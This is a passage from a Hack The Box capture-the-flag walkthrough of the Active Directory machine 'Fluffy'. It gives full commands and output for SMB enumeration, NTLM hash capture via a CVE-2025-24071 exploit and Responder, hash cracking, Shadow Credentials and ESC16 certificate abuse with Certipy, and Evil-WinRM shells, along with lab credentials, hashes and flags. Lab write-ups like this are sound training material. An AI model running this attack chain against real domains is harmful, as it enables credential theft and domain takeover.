  groupname: Protected Users
  type: domain
'526':
  groupname: Key Admins
  type: domain
'527':
  groupname: Enterprise Key Admins
  type: domain
'544':
  groupname: Administrators
  type: builtin
'545':
  groupname: Users
  type: builtin
'546':
  groupname: Guests
  type: builtin
'548':
  groupname: Account Operators
  type: builtin
'549':
  groupname: Server Operators
  type: builtin
'550':
  groupname: Print Operators
  type: builtin
'551':
  groupname: Backup Operators
  type: builtin
'552':
  groupname: Replicator
  type: builtin
'553':
  groupname: RAS and IAS Servers
  type: local
'554':
  groupname: Pre-Windows 2000 Compatible Access
  type: builtin
'555':
  groupname: Remote Desktop Users
  type: builtin
'556':
  groupname: Network Configuration Operators
  type: builtin
'557':
  groupname: Incoming Forest Trust Builders
  type: builtin
'558':
  groupname: Performance Monitor Users
  type: builtin
'559':
  groupname: Performance Log Users
  type: builtin
'560':
  groupname: Windows Authorization Access Group
  type: builtin
'561':
  groupname: Terminal Server License Servers
  type: builtin
'562':
  groupname: Distributed COM Users
  type: builtin
'568':
  groupname: IIS_IUSRS
  type: builtin
'569':
  groupname: Cryptographic Operators
  type: builtin
'571':
  groupname: Allowed RODC Password Replication Group
  type: local
'572':
  groupname: Denied RODC Password Replication Group
  type: local
'573':
  groupname: Event Log Readers
  type: builtin
'574':
  groupname: Certificate Service DCOM Access
  type: builtin
'575':
  groupname: RDS Remote Access Servers
  type: builtin
'576':
  groupname: RDS Endpoint Servers
  type: builtin
'577':
  groupname: RDS Management Servers
  type: builtin
'578':
  groupname: Hyper-V Administrators
  type: builtin
'579':
  groupname: Access Control Assistance Operators
  type: builtin
'580':
  groupname: Remote Management Users
  type: builtin
'582':
  groupname: Storage Replica Administrators
  type: builtin

 =======================================
|    Shares via RPC on 10.129.232.88    |
 =======================================
[*] Enumerating shares
[+] Found 6 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
IT:
  comment: ''
  type: Disk
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share IT
[+] Mapping: OK, Listing: OK
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK

 ==========================================
|    Policies via RPC for 10.129.232.88    |
 ==========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Maximum password age: 41 days 23 hours 53 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 10 minutes
  Lockout duration: 10 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set

 ==========================================
|    Printers via RPC for 10.129.232.88    |
 ==========================================
[+] No printers available

Completed after 7.87 seconds

        
```
Using `enum4linux-ng`, we gather a LOT of information!

All of this gives us a solid starting point for further enumeration!

---

## SMB: A Promising Entry Point

A key service — and almost certainly our initial access point — is **SMB**.  
We’ve already extracted a long list of users and shares. Generally, shared folders on the network are among the first “doors” to open: it’s worth exploring them right away, as we might find interesting files, documents, or directories.

That’s my usual approach for CTFs: in a real-world penetration test, of course, it’s crucial to go step by step and identify **all** potential vulnerabilities.

Let's use **nxc**:

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~]
└──╼ [★]$ nxc smb 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE  
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share

```

One thing that immediately stands out is an exceptionally juicy and non-“classic” share: “IT”, for which we even have write permissions in addition to read access!

Let's dive into it!

---

## IT
We proceed by accessing the IT folder, continuing with a manual exploration in search of what interests us: we absolutely need to find an entry point, a flaw, or a vulnerability…

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~]
└──╼ [★]$ smbclient //10.129.232.88/IT -U FLUFFY/j.fleischman  
Password for [FLUFFY\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May  4 16:41:36 2026
  ..                                  D        0  Mon May  4 16:41:36 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 10:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 10:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 10:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 10:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 09:31:07 2025

```

Our attention falls on several items. There’s a folder called “everything” (to explore), its zipped version, a KeePass database (which we often find on these machines; very often the password databases are protected with weak passwords, or we can find the password written in plain text in some file!), and a PDF file.

For simplicity and speed, I start with the PDF document:

<img width="401" height="565" alt="image" src="https://github.com/AmIACatPurr/HTB-CTF/blob/main/writeups/assets/pdf_in_fluffy.png" />

Well, I was mistaken… we didn’t just find a simple flaw. We found an actual report containing known vulnerabilities, including some critical-level ones!

Without thinking twice, I dive into a Google search, and among the results, I find a fantastic PoC related to the second CVE on the list, 2025-24071:

https://github.com/ThemeHackers/CVE-2025-24071

---

## CVE-2025-24071

I download the exploit, try to understand how it works, and then execute it:

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
└──╼ [★]$ python3 exploit.py -f justdave -i 10.10.14.98


┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
└──╼ [★]$ smbclient //10.129.232.88/IT -U j.fleischman%'J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (7.9 kb/s) (average 7.9 kb/s)

┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
└──╼ [★]$ sudo responder -I tun0 -dwv  
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0



```

...and here it comes!

```bash
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:8a9f52da9a1008b8:CE0F1C84B649BC34D834A73E88E6654B:010100000000000000183377ABDBDC01CB5C75254E3D475400000000020008004B0033004A00440001001E00570049004E002D003500380037004F00370044004A00550048004400540004003400570049004E002D003500380037004F00370044004A0055004800440054002E004B0033004A0044002E004C004F00430041004C00030014004B0033004A0044002E004C004F00430041004C00050014004B0033004A0044002E004C004F00430041004C000700080000183377ABDBDC0106000400020000000800300030000000000000000100000000200000F9CA2AABF78CFFB6581A10F27DB0BF873006D8D31210C820F7CE3778C9D5D9C70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390038000000000000000000
```

We receive the hash of p.agila, one of the domain users. We can proceed to crack the hash using Hashcat:

```bash
remember to gunzip -d rockyou.txt.gz if needed

─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
└──╼ [★]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

..snip..

there you are little one - prometheusx-303
```

---

## Bloodhound
An additional essential step in AD pentesting is without a doubt the use of BloodHound (a tool that maps Active Directory relationships and permissions to help identify attack paths in a domain).

I won’t describe the full installation process or how the tool works in this walkthrough. I’ll simply show the extremely valuable information we obtained, which, as you’ll see, will help us proceed correctly.

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
└──╼ [★]$ bloodhound-python -d fluffy.htb  -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.129.232.88

and then

┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop]
└──╼ [★]$  sudo neo4j console


# Clone repository
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD

# create anc activate virtual environment
python3 -m venv venv
source venv/bin/activate

# Install it
pip install .

(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts

check

(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 get object 'p.agila' --attr memberOf

distinguishedName: CN=Prometheus Agila,CN=Users,DC=fluffy,DC=htb
memberOf: CN=Service Account Managers,CN=Users,DC=fluffy,DC=htb



```

We immediately notice the significance of this information.

Let's dive into it

We’ve pwned the user p.agila, who, due to his relationships, turns out to be a key user: he are a member of the “Service Accounts Managers” group, which has GenericAll on “Service Accounts” (which in turn has GenericWrite on the service accounts ca_svc, ldap_svc, and winrm_svc).

Having these properties (GenericAll and GenericWrite) grants a series of powerful privileges over the referenced objects — privileges that are invaluable.

After researching online, one of the emerging techniques is “Shadow Credentials” (a method to abuse certificate or key permissions in AD to impersonate users or escalate privileges). This is exactly what we will do, using the tool already present in Kali: Certipy or Certipy-AD.

---

## Shadow Credentials and First shell

We launch the attack.
(You’ll notice the use of “faketime”, necessary to handle clock skew issues that unfortunately cause problems with this attack, just as they do, for example, with Kerberoasting. Faketime is the only solution I’ve consistently found to work 100%, so I’ll stick with it.)

```bash

pipx install certipy-ad
(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$ certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc

..snip..

[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8


(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc

..snip..

[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767


```

The attack was successful, and we obtained the hash of winrm_svc!

The next step is obvious… Since we’re dealing with WinRM, it’s time for Evil-WinRM to enter the scene to obtain the first shell — and with it, the user flag!

```bash
(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$  evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 

..snip..

*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
e114b8ba1e58683de05c249e78cdf5fd

```

User flag done

---

## PRIVESC - ESC16

The privilege escalation step is often the most challenging. If it’s already tough when working locally, imagine how it is in a Domain environment! But this shouldn’t discourage us — on the contrary, it should give us a lot of motivation.

In our specific case, we know we have “power” over a service account called ca_svc, and we also know that one of the ways to perform a privesc in an AD environment is through the exploitation of vulnerable certificates.

The step I decided to take, therefore, was to target ca_svc and repeat the same attack we performed against winrm_svc. But in this case, as we’ll see, it’s not to obtain a shell as ca_svc — rather, it’s to leverage its capabilities.

So, we will proceed as follows:

- Add our p.agila account to the service accounts (with BloodyAD);
- Perform Shadow Credentials with Certipy (as done previously);
- Use the obtained ca_svc credentials to find and exploit vulnerable certificates;



```bash
(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$ certipy find -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -stdout -vulnerable -dc-ip 10.129.232.88
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
[*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'fluffy-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:12:16+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
                                          FLUFFY.HTB\Administrators
        Read                            : FLUFFY.HTB\Administrators
Certificate Templates                   : [!] Could not find any certificate templates


```

Got it! We found the ESC16 vulnerability (a flaw in certain AD certificate configurations that allows attackers to escalate privileges by abusing certificate-based authentication).

When you encounter certificate vulnerabilities, I highly recommend following step-by-step the excellent instructions provided in the official Certipy Github page (...this led me directly to the root flag):

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

Below, I outline the steps I followed. If you want a detailed explanation, feel free to check the link above.

1. Read the UPN of the victim (in our case, ca_svc):


```bash
(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$ certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -user 'ca_svc' read
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb

```


2. Update the victim’s UPN (ca_svc) to that of the Admin:

```bash
(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$ certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -upn 'administrator' -user 'ca_svc' update
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'

```

3. Request a certificate using the “User” template:

```bash
(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$ certipy req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 21
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

4. Restore the UPN of the victim account (ca_svc):

```bash
(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$ certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'


```


5. Authenticate as the administrator (due to clock skew preventing the command from working correctly, we add faketime):

```bash
(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$ certipy auth -dc-ip '10.129.232.88' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e


```

**well well well!** We have obtained the administrator’s hash!

---

## Root

There’s little to comment on. The final step is that breath of fresh air that fills you with oxygen, and after so much effort, makes you say: I did it! It’s over!

So, let’s conclude this amazing machine:

```bash
(venv) ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~/Desktop/bloodyAD]
└──╼ [★]$ evil-winrm -i 10.129.232.88 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator


```

```bash

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
dbfeccc5a621a08d50b662808d020d27

```

---

## Conclusion

Personally, I faced a real challenge. As I mentioned in the introduction, during Season 8, partly due to lack of time and partly because of other commitments, I hadn’t been able to finish it: I reached the first flag and then got stuck. For me, this machine was fundamental — I was preparing for the PJPT, which focuses on internal penetration testing, and I needed it as practice. After hours and hours of attempts, however… I gave up.

Nevertheless, before Fluffy’s retirement, and after the excitement of successfully passing the PJPT, I picked it up again and brought it to completion.

It was a fantastic experience: I had the chance to review “classic” concepts and learn new things. It felt like a complete machine for Active Directory, and the certificate-related part undeniably opens up a whole new world.

HTB says it’s easy, but… either I’m really bad, or HTB’s “easy” is at least equivalent to medium on any other platform.

That said, I’ll sign off here!

Happy Hacking!
